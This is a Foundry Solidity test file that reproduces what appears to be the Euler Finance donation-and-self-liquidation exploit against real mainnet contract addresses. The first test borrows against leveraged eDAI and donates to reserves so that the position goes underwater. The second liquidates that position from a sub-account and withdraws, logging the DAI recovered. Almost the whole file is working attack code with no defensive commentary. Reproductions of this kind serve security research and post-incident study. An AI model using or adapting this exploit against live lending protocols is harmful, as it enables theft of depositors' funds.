pragma solidity 0.8.23;
import "forge-std/Test.sol";
interface IERC20 { function balanceOf(address) external view returns (uint256); function approve(address, uint256) external returns (bool); }
interface IExec { struct Item { bool ae; address p; bytes d; } function batchDispatch(Item[] calldata, address[] calldata) external; }
interface IET { function balanceOf(address) external view returns (uint256); }
interface IDT { function balanceOf(address) external view returns (uint256); }

contract TestEulerStep is Test {
    address constant E = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address constant EX = 0x59828FdF7ee634AaaD3f58B19fDBa3b03E2D9d80;
    address constant M = 0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3;
    address constant L = 0x7123C8cBBD76c5C7fCC9f7150f23179bec0bA341;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant eD = 0xe025E3ca2bE02316033184551D4d3Aa22024D9DC;
    address constant dD = 0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686;
    
    function setUp() public { deal(DAI, address(this), 30_000_000e18); }
    
    function testStep1_DonateOnly() public {
        IERC20(DAI).approve(E, type(uint256).max);
        IExec.Item[] memory it = new IExec.Item[](4);
        it[0] = IExec.Item(false, M, abi.encodeWithSignature("enterMarket(uint256,address)",0,DAI));
        it[1] = IExec.Item(false, eD, abi.encodeWithSignature("deposit(uint256,uint256)",0,20_000_000e18));
        it[2] = IExec.Item(false, eD, abi.encodeWithSignature("mint(uint256,uint256)",0,180_000_000e18));
        it[3] = IExec.Item(false, eD, abi.encodeWithSignature("donateToReserves(uint256,uint256)",0,100_000_000e18));
        address[] memory df = new address[](1); df[0] = address(this);
        IExec(EX).batchDispatch(it, df);
        
        uint256 eB = IET(eD).balanceOf(address(this));
        uint256 dB = IDT(dD).balanceOf(address(this));
        emit log_named_uint("eDAI", eB);
        emit log_named_uint("dDAI", dB);
        emit log("Step1 OK: position is underwater");
    }
    
    function testStep2_LiquidateAfterDonate() public {
        IERC20(DAI).approve(E, type(uint256).max);
        // First create underwater position
        IExec.Item[] memory it1 = new IExec.Item[](4);
        it1[0] = IExec.Item(false, M, abi.encodeWithSignature("enterMarket(uint256,address)",0,DAI));
        it1[1] = IExec.Item(false, eD, abi.encodeWithSignature("deposit(uint256,uint256)",0,20_000_000e18));
        it1[2] = IExec.Item(false, eD, abi.encodeWithSignature("mint(uint256,uint256)",0,180_000_000e18));
        it1[3] = IExec.Item(false, eD, abi.encodeWithSignature("donateToReserves(uint256,uint256)",0,100_000_000e18));
        address[] memory df1 = new address[](1); df1[0] = address(this);
        IExec(EX).batchDispatch(it1, df1);
        
        emit log("Position created, now liquidate...");
        
        // Now in a SEPARATE batch, liquidate from sub1 + withdraw
        IExec.Item[] memory it2 = new IExec.Item[](2);
        it2[0] = IExec.Item(false, L, abi.encodeWithSignature("liquidate(address,address,address,uint256,uint256)", address(this), DAI, DAI, type(uint256).max, 0));
        it2[1] = IExec.Item(false, eD, abi.encodeWithSignature("withdraw(uint256,uint256)", 1, type(uint256).max));
        address[] memory df2 = new address[](2);
        df2[0] = address(this);
        df2[1] = address(uint160(uint160(address(this)) ^ 1));
        IExec(EX).batchDispatch(it2, df2);
        
        uint256 daiProfit = IERC20(DAI).balanceOf(address(this));
        emit log_named_uint("DAI recovered", daiProfit);
    }
    
    receive() external payable {}
}
